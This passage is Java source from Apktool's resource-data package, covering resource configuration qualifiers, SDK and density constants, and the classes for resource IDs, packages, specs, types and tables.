            case UI_MODE_TYPE_APPLIANCE:
                ret.append("-appliance");
                break;
            case UI_MODE_TYPE_WATCH:
                ret.append("-watch");
                break;
            case UI_MODE_TYPE_VR_HEADSET:
                ret.append("-vrheadset");
                break;
        }
        switch (uiMode & MASK_UI_MODE_NIGHT) {
            case UI_MODE_NIGHT_YES:
                ret.append("-night");
                break;
            case UI_MODE_NIGHT_NO:
                ret.append("-notnight");
                break;
        }
        switch (density) {
            case DENSITY_DEFAULT:
                break;
            case DENSITY_LOW:
                ret.append("-ldpi");
                break;
            case DENSITY_MEDIUM:
                ret.append("-mdpi");
                break;
            case DENSITY_HIGH:
                ret.append("-hdpi");
                break;
            case DENSITY_TV:
                ret.append("-tvdpi");
                break;
            case DENSITY_XHIGH:
                ret.append("-xhdpi");
                break;
            case DENSITY_XXHIGH:
                ret.append("-xxhdpi");
                break;
            case DENSITY_XXXHIGH:
                ret.append("-xxxhdpi");
                break;
            case DENSITY_ANY:
                ret.append("-anydpi");
                break;
            case DENSITY_NONE:
                ret.append("-nodpi");
                break;
            default:
                ret.append('-').append(density).append("dpi");
        }
        switch (touchscreen) {
            case TOUCHSCREEN_NOTOUCH:
                ret.append("-notouch");
                break;
            case TOUCHSCREEN_STYLUS:
                ret.append("-stylus");
                break;
            case TOUCHSCREEN_FINGER:
                ret.append("-finger");
                break;
        }
        switch (inputFlags & MASK_KEYSHIDDEN) {
            case KEYSHIDDEN_NO:
                ret.append("-keysexposed");
                break;
            case KEYSHIDDEN_YES:
                ret.append("-keyshidden");
                break;
            case KEYSHIDDEN_SOFT:
                ret.append("-keyssoft");
                break;
        }
        switch (keyboard) {
            case KEYBOARD_NOKEYS:
                ret.append("-nokeys");
                break;
            case KEYBOARD_QWERTY:
                ret.append("-qwerty");
                break;
            case KEYBOARD_12KEY:
                ret.append("-12key");
                break;
        }
        switch (inputFlags & MASK_NAVHIDDEN) {
            case NAVHIDDEN_NO:
                ret.append("-navexposed");
                break;
            case NAVHIDDEN_YES:
                ret.append("-navhidden");
                break;
        }
        switch (navigation) {
            case NAVIGATION_NONAV:
                ret.append("-nonav");
                break;
            case NAVIGATION_DPAD:
                ret.append("-dpad");
                break;
            case NAVIGATION_TRACKBALL:
                ret.append("-trackball");
                break;
            case NAVIGATION_WHEEL:
                ret.append("-wheel");
                break;
        }
        if (screenWidth != 0 && screenHeight != 0) {
            if (screenWidth > screenHeight) {
                ret.append(String.format("-%dx%d", screenWidth, screenHeight));
            } else {
                ret.append(String.format("-%dx%d", screenHeight, screenWidth));
            }
        }
        if (sdkVersion > 0 && sdkVersion >= getNaturalSdkVersionRequirement()) {
            ret.append("-v").append(sdkVersion);
        }
        if (isInvalid) {
            ret.append("-ERR").append(sErrCounter++);
        }

        return ret.toString();
    }

    private short getNaturalSdkVersionRequirement() {
        if ((uiMode & MASK_UI_MODE_TYPE) == UI_MODE_TYPE_VR_HEADSET || (colorMode & COLOR_WIDE_MASK) != 0 || ((colorMode & COLOR_HDR_MASK) != 0)) {
            return SDK_OREO;
        }
        if ((screenLayout2 & MASK_SCREENROUND) != 0) {
            return SDK_MNC;
        }
        if (density == DENSITY_ANY) {
            return SDK_LOLLIPOP;
        }
        if (smallestScreenWidthDp != 0 || screenWidthDp != 0 || screenHeightDp != 0) {
            return SDK_HONEYCOMB_MR2;
        }
        if ((uiMode & (MASK_UI_MODE_TYPE | MASK_UI_MODE_NIGHT)) != UI_MODE_NIGHT_ANY) {
            return SDK_FROYO;
        }
        if ((screenLayout & (MASK_SCREENSIZE | MASK_SCREENLONG)) != SCREENSIZE_ANY || density != DENSITY_DEFAULT) {
            return SDK_DONUT;
        }
        return 0;
    }

    private String getLocaleString() {
        StringBuilder sb = new StringBuilder();

        // check for old style non BCP47 tags
        // allows values-xx-rXX, values-xx, values-xxx-rXX
        // denies values-xxx, anything else
        if (localeVariant == null && localeScript == null && (region[0] != '\00' || language[0] != '\00') &&
                region.length != 3) {
            sb.append("-").append(language);
            if (region[0] != '\00') {
                sb.append("-r").append(region);
            }
        } else { // BCP47
            if (language[0] == '\00' && region[0] == '\00') {
                return sb.toString(); // early return, no language or region
            }
            sb.append("-b+");
            if (language[0] != '\00') {
                sb.append(language);
            }
            if (localeScript != null && localeScript.length == 4) {
                sb.append("+").append(localeScript);
            }
            if ((region.length == 2 || region.length == 3) && region[0] != '\00') {
                sb.append("+").append(region);
            }
            if (localeVariant != null && localeVariant.length >= 5) {
                sb.append("+").append(toUpper(localeVariant));
            }
        }
        return sb.toString();
    }

    private String toUpper(char[] character) {
        StringBuilder sb = new StringBuilder();
        for (char ch: character) {
            sb.append(Character.toUpperCase(ch));
        }
        return sb.toString();
    }


    @Override
    public String toString() {
        return !getQualifiers().equals("") ? getQualifiers() : "[DEFAULT]";
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final ResConfigFlags other = (ResConfigFlags) obj;
        return this.mQualifiers.equals(other.mQualifiers);
    }

    @Override
    public int hashCode() {
        int hash = 17;
        hash = 31 * hash + this.mQualifiers.hashCode();
        return hash;
    }

    // TODO: Dirty static hack. This counter should be a part of ResPackage,
    // but it would be hard right now and this feature is very rarely used.
    private static int sErrCounter = 0;

    public final static byte SDK_BASE = 1;
    public final static byte SDK_BASE_1_1 = 2;
    public final static byte SDK_CUPCAKE = 3;
    public final static byte SDK_DONUT = 4;
    public final static byte SDK_ECLAIR = 5;
    public final static byte SDK_ECLAIR_0_1 = 6;
    public final static byte SDK_ECLAIR_MR1 = 7;
    public final static byte SDK_FROYO = 8;
    public final static byte SDK_GINGERBREAD = 9;
    public final static byte SDK_GINGERBREAD_MR1 = 10;
    public final static byte SDK_HONEYCOMB = 11;
    public final static byte SDK_HONEYCOMB_MR1 = 12;
    public final static byte SDK_HONEYCOMB_MR2 = 13;
    public final static byte SDK_ICE_CREAM_SANDWICH = 14;
    public final static byte SDK_ICE_CREAM_SANDWICH_MR1 = 15;
    public final static byte SDK_JELLY_BEAN = 16;
    public final static byte SDK_JELLY_BEAN_MR1 = 17;
    public final static byte SDK_JELLY_BEAN_MR2 = 18;
    public final static byte SDK_KITKAT = 19;
    public final static byte SDK_LOLLIPOP = 21;
    public final static byte SDK_LOLLIPOP_MR1 = 22;
    public final static byte SDK_MNC = 23;
    public final static byte SDK_NOUGAT = 24;
    public final static byte SDK_NOUGAT_MR1 = 25;
    public final static byte SDK_OREO = 26;
    public final static byte SDK_OREO_MR1 = 27;
    public final static byte SDK_P = 28;
    public final static byte SDK_Q = 29;
    public final static byte SDK_R = 30;
    public final static byte SDK_S = 31;
    public final static byte SDK_S_V2 = 32;
    public final static byte SDK_T = 33;

    // AOSP has this as 10,000 for dev purposes.
    // platform_frameworks_base/commit/c7a1109a1fe0771d4c9b572dcf178e2779fc4f2d
    public final static int SDK_DEVELOPMENT = 10000;

    public final static byte ORIENTATION_ANY = 0;
    public final static byte ORIENTATION_PORT = 1;
    public final static byte ORIENTATION_LAND = 2;
    public final static byte ORIENTATION_SQUARE = 3;

    public final static byte TOUCHSCREEN_ANY = 0;
    public final static byte TOUCHSCREEN_NOTOUCH = 1;
    public final static byte TOUCHSCREEN_STYLUS = 2;
    public final static byte TOUCHSCREEN_FINGER = 3;

    public final static int DENSITY_DEFAULT = 0;
    public final static int DENSITY_LOW = 120;
    public final static int DENSITY_MEDIUM = 160;
    public final static int DENSITY_400 = 190;
    public final static int DENSITY_TV = 213;
    public final static int DENSITY_HIGH = 240;
    public final static int DENSITY_XHIGH = 320;
    public final static int DENSITY_XXHIGH = 480;
    public final static int DENSITY_XXXHIGH = 640;
    public final static int DENSITY_ANY = 0xFFFE;
    public final static int DENSITY_NONE = 0xFFFF;

    public final static int MNC_ZERO = -1;

    public final static short MASK_LAYOUTDIR = 0xc0;
    public final static short SCREENLAYOUT_LAYOUTDIR_ANY = 0x00;
    public final static short SCREENLAYOUT_LAYOUTDIR_LTR = 0x40;
    public final static short SCREENLAYOUT_LAYOUTDIR_RTL = 0x80;
    public final static short SCREENLAYOUT_LAYOUTDIR_SHIFT = 0x06;

    public final static short MASK_SCREENROUND = 0x03;
    public final static short SCREENLAYOUT_ROUND_ANY = 0;
    public final static short SCREENLAYOUT_ROUND_NO = 0x1;
    public final static short SCREENLAYOUT_ROUND_YES = 0x2;

    public final static byte KEYBOARD_ANY = 0;
    public final static byte KEYBOARD_NOKEYS = 1;
    public final static byte KEYBOARD_QWERTY = 2;
    public final static byte KEYBOARD_12KEY = 3;

    public final static byte NAVIGATION_ANY = 0;
    public final static byte NAVIGATION_NONAV = 1;
    public final static byte NAVIGATION_DPAD = 2;
    public final static byte NAVIGATION_TRACKBALL = 3;
    public final static byte NAVIGATION_WHEEL = 4;

    public final static byte MASK_KEYSHIDDEN = 0x3;
    public final static byte KEYSHIDDEN_ANY = 0x0;
    public final static byte KEYSHIDDEN_NO = 0x1;
    public final static byte KEYSHIDDEN_YES = 0x2;
    public final static byte KEYSHIDDEN_SOFT = 0x3;

    public final static byte MASK_NAVHIDDEN = 0xc;
    public final static byte NAVHIDDEN_ANY = 0x0;
    public final static byte NAVHIDDEN_NO = 0x4;
    public final static byte NAVHIDDEN_YES = 0x8;

    public final static byte MASK_SCREENSIZE = 0x0f;
    public final static byte SCREENSIZE_ANY = 0x00;
    public final static byte SCREENSIZE_SMALL = 0x01;
    public final static byte SCREENSIZE_NORMAL = 0x02;
    public final static byte SCREENSIZE_LARGE = 0x03;
    public final static byte SCREENSIZE_XLARGE = 0x04;

    public final static byte MASK_SCREENLONG = 0x30;
    public final static byte SCREENLONG_ANY = 0x00;
    public final static byte SCREENLONG_NO = 0x10;
    public final static byte SCREENLONG_YES = 0x20;

    public final static byte MASK_UI_MODE_TYPE = 0x0f;
    public final static byte UI_MODE_TYPE_ANY = 0x00;
    public final static byte UI_MODE_TYPE_NORMAL = 0x01;
    public final static byte UI_MODE_TYPE_DESK = 0x02;
    public final static byte UI_MODE_TYPE_CAR = 0x03;
    public final static byte UI_MODE_TYPE_TELEVISION = 0x04;
    public final static byte UI_MODE_TYPE_APPLIANCE = 0x05;
    public final static byte UI_MODE_TYPE_WATCH = 0x06;
    public final static byte UI_MODE_TYPE_VR_HEADSET = 0x07;

    // start - miui
    public final static byte UI_MODE_TYPE_GODZILLAUI = 0x0b;
    public final static byte UI_MODE_TYPE_SMALLUI = 0x0c;
    public final static byte UI_MODE_TYPE_MEDIUMUI = 0x0d;
    public final static byte UI_MODE_TYPE_LARGEUI = 0x0e;
    public final static byte UI_MODE_TYPE_HUGEUI = 0x0f;
    // end - miui

    public final static byte MASK_UI_MODE_NIGHT = 0x30;
    public final static byte UI_MODE_NIGHT_ANY = 0x00;
    public final static byte UI_MODE_NIGHT_NO = 0x10;
    public final static byte UI_MODE_NIGHT_YES = 0x20;

    public final static byte COLOR_HDR_MASK = 0xC;
    public final static byte COLOR_HDR_NO = 0x4;
    public final static byte COLOR_HDR_SHIFT = 0x2;
    public final static byte COLOR_HDR_UNDEFINED = 0x0;
    public final static byte COLOR_HDR_YES = 0x8;

    public final static byte COLOR_UNDEFINED = 0x0;

    public final static byte COLOR_WIDE_UNDEFINED = 0x0;
    public final static byte COLOR_WIDE_NO = 0x1;
    public final static byte COLOR_WIDE_YES = 0x2;
    public final static byte COLOR_WIDE_MASK = 0x3;

    private static final Logger LOGGER = Logger.getLogger(ResConfigFlags.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResID.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

public class ResID {
    public final int package_;
    public final int type;
    public final int entry;

    public final int id;

    public ResID(int package_, int type, int entry) {
        this(package_, type, entry, (package_ << 24) + (type << 16) + entry);
    }

    public ResID(int id) {
        this((id >> 24) & 0xff, (id >> 16) & 0x000000ff, id & 0x0000ffff, id);
    }

    public ResID(int package_, int type, int entry, int id) {
        this.package_ = (package_ == 0) ? 2 : package_;
        this.type = type;
        this.entry = entry;
        this.id = id;
    }

    @Override
    public String toString() {
        return String.format("0x%08x", id);
    }

    @Override
    public int hashCode() {
        int hash = 17;
        hash = 31 * hash + this.id;
        return hash;
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final ResID other = (ResID) obj;
        return this.id == other.id;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResPackage.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
import brut.androlib.res.data.value.ResFileValue;
import brut.androlib.res.data.value.ResValueFactory;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.util.Duo;
import java.util.*;
import java.util.logging.Logger;

public class ResPackage {
    private final ResTable mResTable;
    private final int mId;
    private final String mName;
    private final Map<ResID, ResResSpec> mResSpecs = new LinkedHashMap<>();
    private final Map<ResConfigFlags, ResType> mConfigs = new LinkedHashMap<>();
    private final Map<String, ResTypeSpec> mTypes = new LinkedHashMap<>();
    private final Set<ResID> mSynthesizedRes = new HashSet<>();

    private ResValueFactory mValueFactory;

    public ResPackage(ResTable resTable, int id, String name) {
        this.mResTable = resTable;
        this.mId = id;
        this.mName = name;
    }

    public List<ResResSpec> listResSpecs() {
        return new ArrayList<>(mResSpecs.values());
    }

    public boolean hasResSpec(ResID resID) {
        return mResSpecs.containsKey(resID);
    }

    public ResResSpec getResSpec(ResID resID) throws UndefinedResObjectException {
        ResResSpec spec = mResSpecs.get(resID);
        if (spec == null) {
            throw new UndefinedResObjectException("resource spec: " + resID.toString());
        }
        return spec;
    }

    public int getResSpecCount() {
        return mResSpecs.size();
    }

    public ResType getOrCreateConfig(ResConfigFlags flags) {
        ResType config = mConfigs.get(flags);
        if (config == null) {
            config = new ResType(flags);
            mConfigs.put(flags, config);
        }
        return config;
    }

    public ResTypeSpec getType(String typeName) throws AndrolibException {
        ResTypeSpec type = mTypes.get(typeName);
        if (type == null) {
            throw new UndefinedResObjectException("type: " + typeName);
        }
        return type;
    }

    public Set<ResResource> listFiles() {
        Set<ResResource> ret = new HashSet<>();
        for (ResResSpec spec : mResSpecs.values()) {
            for (ResResource res : spec.listResources()) {
                if (res.getValue() instanceof ResFileValue) {
                    ret.add(res);
                }
            }
        }
        return ret;
    }

    public Collection<ResValuesFile> listValuesFiles() {
        Map<Duo<ResTypeSpec, ResType>, ResValuesFile> ret = new HashMap<>();
        for (ResResSpec spec : mResSpecs.values()) {
            for (ResResource res : spec.listResources()) {
                if (res.getValue() instanceof ResValuesXmlSerializable) {
                    ResTypeSpec type = res.getResSpec().getType();
                    ResType config = res.getConfig();
                    Duo<ResTypeSpec, ResType> key = new Duo<>(type, config);
                    ResValuesFile values = ret.get(key);
                    if (values == null) {
                        values = new ResValuesFile(this, type, config);
                        ret.put(key, values);
                    }
                    values.addResource(res);
                }
            }
        }
        return ret.values();
    }

    public ResTable getResTable() {
        return mResTable;
    }

    public int getId() {
        return mId;
    }

    public String getName() {
        return mName;
    }

    boolean isSynthesized(ResID resId) {
        return mSynthesizedRes.contains(resId);
    }

    public void removeResSpec(ResResSpec spec) {
        mResSpecs.remove(spec.getId());
    }

    public void addResSpec(ResResSpec spec) throws AndrolibException {
        if (mResSpecs.put(spec.getId(), spec) != null) {
            throw new AndrolibException("Multiple resource specs: " + spec);
        }
    }

    public void addType(ResTypeSpec type) {
        if (mTypes.containsKey(type.getName())) {
            LOGGER.warning("Multiple types detected! " + type + " ignored!");
        } else {
            mTypes.put(type.getName(), type);
        }
    }

    public void addSynthesizedRes(int resId) {
        mSynthesizedRes.add(new ResID(resId));
    }

    @Override
    public String toString() {
        return mName;
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final ResPackage other = (ResPackage) obj;
        if (!Objects.equals(this.mResTable, other.mResTable)) {
            return false;
        }
        return this.mId == other.mId;
    }

    @Override
    public int hashCode() {
        int hash = 17;
        hash = 31 * hash + (this.mResTable != null ? this.mResTable.hashCode() : 0);
        hash = 31 * hash + this.mId;
        return hash;
    }

    public ResValueFactory getValueFactory() {
        if (mValueFactory == null) {
            mValueFactory = new ResValueFactory(this);
        }
        return mValueFactory;
    }

    private final static Logger LOGGER = Logger.getLogger(ResPackage.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResResSpec.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
import org.apache.commons.lang3.StringUtils;

import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;

public class ResResSpec {
    private final ResID mId;
    private final String mName;
    private final ResPackage mPackage;
    private final ResTypeSpec mType;
    private final Map<ResConfigFlags, ResResource> mResources = new LinkedHashMap<>();

    public ResResSpec(ResID id, String name, ResPackage pkg, ResTypeSpec type) {
        this.mId = id;
        String cleanName;

        ResResSpec resResSpec = type.getResSpecUnsafe(name);
        if (resResSpec != null) {
            cleanName = String.format("APKTOOL_DUPLICATE_%s_%s", type, id.toString());
        } else {
            cleanName = ((name == null || name.isEmpty()) ? ("APKTOOL_DUMMYVAL_" + id.toString()) : name);
        }

        this.mName = cleanName;
        this.mPackage = pkg;
        this.mType = type;
    }

    public Set<ResResource> listResources() {
        return new LinkedHashSet<>(mResources.values());
    }

    public ResResource getResource(ResType config) throws AndrolibException {
        return getResource(config.getFlags());
    }

    public ResResource getResource(ResConfigFlags config) throws AndrolibException {
        ResResource res = mResources.get(config);
        if (res == null) {
            throw new UndefinedResObjectException(String.format("resource: spec=%s, config=%s", this, config));
        }
        return res;
    }

    public ResResource getDefaultResource() throws AndrolibException {
        return getResource(new ResConfigFlags());
    }

    public boolean hasDefaultResource() {
        return mResources.containsKey(new ResConfigFlags());
    }

    public String getFullName(ResPackage relativeToPackage, boolean excludeType) {
        return getFullName(getPackage().equals(relativeToPackage), excludeType);
    }

    public String getFullName(boolean excludePackage, boolean excludeType) {
        return (excludePackage ? "" : getPackage().getName() + ":")
                + (excludeType ? "" : getType().getName() + "/") + getName();
    }

    public ResID getId() {
        return mId;
    }

    public String getName() {
        return StringUtils.replace(mName, "\"", "q");
    }

    public ResPackage getPackage() {
        return mPackage;
    }

    public ResTypeSpec getType() {
        return mType;
    }

    public boolean isDummyResSpec() {
        return getName().startsWith("APKTOOL_DUMMY_");
    }

    public void addResource(ResResource res) throws AndrolibException {
        addResource(res, false);
    }

    public void addResource(ResResource res, boolean overwrite) throws AndrolibException {
        ResConfigFlags flags = res.getConfig().getFlags();
        if (mResources.put(flags, res) != null && !overwrite) {
            throw new AndrolibException(String.format("Multiple resources: spec=%s, config=%s", this, flags));
        }
    }

    @Override
    public String toString() {
        return mId.toString() + " " + mType.toString() + "/" + mName;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResResource.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.value.ResValue;

public class ResResource {
    private final ResType mConfig;
    private final ResResSpec mResSpec;
    private final ResValue mValue;

    public ResResource(ResType config, ResResSpec spec, ResValue value) {
        this.mConfig = config;
        this.mResSpec = spec;
        this.mValue = value;
    }

    public String getFilePath() {
        return mResSpec.getType().getName() + mConfig.getFlags().getQualifiers() + "/" + mResSpec.getName();
    }

    public ResType getConfig() {
        return mConfig;
    }

    public ResResSpec getResSpec() {
        return mResSpec;
    }

    public ResValue getValue() {
        return mValue;
    }

    public void replace(ResValue value) throws AndrolibException {
        ResResource res = new ResResource(mConfig, mResSpec, value);
        mConfig.addResource(res, true);
        mResSpec.addResource(res, true);
    }

    @Override
    public String toString() {
        return getFilePath();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResTable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
import brut.androlib.meta.VersionInfo;
import brut.androlib.res.AndrolibResources;
import brut.androlib.res.data.value.ResValue;
import java.util.*;

public class ResTable {
    private final AndrolibResources mAndRes;

    private final Map<Integer, ResPackage> mPackagesById = new HashMap<>();
    private final Map<String, ResPackage> mPackagesByName = new HashMap<>();
    private final Set<ResPackage> mMainPackages = new LinkedHashSet<>();
    private final Set<ResPackage> mFramePackages = new LinkedHashSet<>();

    private String mPackageRenamed;
    private String mPackageOriginal;
    private int mPackageId;
    private boolean mAnalysisMode = false;
    private boolean mSharedLibrary = false;
    private boolean mSparseResources = false;

    private final Map<String, String> mSdkInfo = new LinkedHashMap<>();
    private final VersionInfo mVersionInfo = new VersionInfo();

    public ResTable() {
        mAndRes = null;
    }

    public ResTable(AndrolibResources andRes) {
        mAndRes = andRes;
    }

    public ResResSpec getResSpec(int resID) throws AndrolibException {
        // The pkgId is 0x00. That means a shared library is using its
        // own resource, so lie to the caller replacing with its own
        // packageId
        if (resID >> 24 == 0) {
            int pkgId = (mPackageId == 0 ? 2 : mPackageId);
            resID = (0xFF000000 & (pkgId << 24)) | resID;
        }
        return getResSpec(new ResID(resID));
    }

    public ResResSpec getResSpec(ResID resID) throws AndrolibException {
        return getPackage(resID.package_).getResSpec(resID);
    }

    public Set<ResPackage> listMainPackages() {
        return mMainPackages;
    }

    public Set<ResPackage> listFramePackages() {
        return mFramePackages;
    }

    public ResPackage getPackage(int id) throws AndrolibException {
        ResPackage pkg = mPackagesById.get(id);
        if (pkg != null) {
            return pkg;
        }
        if (mAndRes != null) {
            return mAndRes.loadFrameworkPkg(this, id, mAndRes.buildOptions.frameworkTag);
        }
        throw new UndefinedResObjectException(String.format("package: id=%d", id));
    }

    public ResPackage getHighestSpecPackage() throws AndrolibException {
        int id = 0;
        int value = 0;
        for (ResPackage resPackage : mPackagesById.values()) {
            if (resPackage.getResSpecCount() > value && !resPackage.getName().equalsIgnoreCase("android")) {
                value = resPackage.getResSpecCount();
                id = resPackage.getId();
            }
        }
        // if id is still 0, we only have one pkgId which is "android" -> 1
        return (id == 0) ? getPackage(1) : getPackage(id);
    }

    public ResPackage getCurrentResPackage() throws AndrolibException {
        ResPackage pkg = mPackagesById.get(mPackageId);

        if (pkg != null) {
            return pkg;
        } else {
            if (mMainPackages.size() == 1) {
                return mMainPackages.iterator().next();
            }
            return getHighestSpecPackage();
        }
    }

    public ResPackage getPackage(String name) throws AndrolibException {
        ResPackage pkg = mPackagesByName.get(name);
        if (pkg == null) {
            throw new UndefinedResObjectException("package: name=" + name);
        }
        return pkg;
    }

    public ResValue getValue(String package_, String type, String name) throws AndrolibException {
        return getPackage(package_).getType(type).getResSpec(name).getDefaultResource().getValue();
    }

    public void addPackage(ResPackage pkg, boolean main) throws AndrolibException {
        Integer id = pkg.getId();
        if (mPackagesById.containsKey(id)) {
            throw new AndrolibException("Multiple packages: id=" + id);
        }
        String name = pkg.getName();
        if (mPackagesByName.containsKey(name)) {
            throw new AndrolibException("Multiple packages: name=" + name);
        }

        mPackagesById.put(id, pkg);
        mPackagesByName.put(name, pkg);
        if (main) {
            mMainPackages.add(pkg);
        } else {
            mFramePackages.add(pkg);
        }
    }

    public void setAnalysisMode(boolean mode) {
        mAnalysisMode = mode;
    }

    public void setPackageRenamed(String pkg) {
        mPackageRenamed = pkg;
    }

    public void setPackageOriginal(String pkg) {
        mPackageOriginal = pkg;
    }

    public void setPackageId(int id) {
        mPackageId = id;
    }

    public void setSharedLibrary(boolean flag) {
        mSharedLibrary = flag;
    }

    public void setSparseResources(boolean flag) {
        mSparseResources = flag;
    }

    public void clearSdkInfo() {
        mSdkInfo.clear();
    }

    public void addSdkInfo(String key, String value) {
        mSdkInfo.put(key, value);
    }

    public void setVersionName(String versionName) {
        mVersionInfo.versionName = versionName;
    }

    public void setVersionCode(String versionCode) {
        mVersionInfo.versionCode = versionCode;
    }

    public VersionInfo getVersionInfo() {
        return mVersionInfo;
    }

    public Map<String, String> getSdkInfo() {
        return mSdkInfo;
    }

    public boolean getAnalysisMode() {
        return mAnalysisMode;
    }

    public String getPackageRenamed() {
        return mPackageRenamed;
    }

    public String getPackageOriginal() {
        return mPackageOriginal;
    }

    public int getPackageId() {
        return mPackageId;
    }

    public boolean getSharedLibrary() {
        return mSharedLibrary;
    }

    public boolean getSparseResources() {
        return mSparseResources;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResType.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
import java.util.*;

public class ResType {
    private final ResConfigFlags mFlags;
    private final Map<ResResSpec, ResResource> mResources = new LinkedHashMap<>();

    public ResType(ResConfigFlags flags) {
        this.mFlags = flags;
    }

    public ResResource getResource(ResResSpec spec) throws AndrolibException {
        ResResource res = mResources.get(spec);
        if (res == null) {
            throw new UndefinedResObjectException(String.format("resource: spec=%s, config=%s", spec, this));
        }
        return res;
    }

    public ResConfigFlags getFlags() {
        return mFlags;
    }

    public void addResource(ResResource res) throws AndrolibException {
        addResource(res, false);
    }

    public void addResource(ResResource res, boolean overwrite) throws AndrolibException {
        ResResSpec spec = res.getResSpec();
        if (mResources.put(spec, res) != null && !overwrite) {
            throw new AndrolibException(String.format("Multiple resources: spec=%s, config=%s", spec, this));
        }
    }

    @Override
    public String toString() {
        return mFlags.toString();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResTypeSpec.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
